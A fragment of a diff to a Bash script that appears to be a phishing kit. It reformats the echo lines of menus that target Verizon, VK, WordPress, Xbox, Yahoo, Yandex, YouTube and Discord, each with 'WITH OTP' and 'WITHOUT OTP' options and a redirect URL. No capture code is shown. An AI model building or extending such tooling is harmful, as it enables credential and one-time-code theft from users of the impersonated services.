-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2533,11 +2531,11 @@ esac
 site_verizon(){
 siname="Verizon"
 rdurl="www.verizon.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2566,11 +2564,11 @@ tunnelmenu
 site_vk(){
 siname="VK"
 rdurl="vk.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
@@ -2603,11 +2601,11 @@ tunnelmenu
 site_wordpress(){
 siname="Wordpress"
 rdurl="wordpress.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2629,11 +2627,11 @@ esac
 site_xbox(){
 siname="Xbox"
 rdurl="www.xbox.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2655,11 +2653,11 @@ esac
 site_yahoo(){
 siname="Yahoo"
 rdurl="yahoo.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2681,11 +2679,11 @@ esac
 site_yandex(){
 siname="Yandex"
 rdurl="yandex.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2707,11 +2705,11 @@ esac
 site_ytsubs(){
 siname="YT subs"
 rdurl="www.youtube.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2734,11 +2732,11 @@ esac
 site_discord(){
 siname="Discord"
 rdurl="www.discord.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
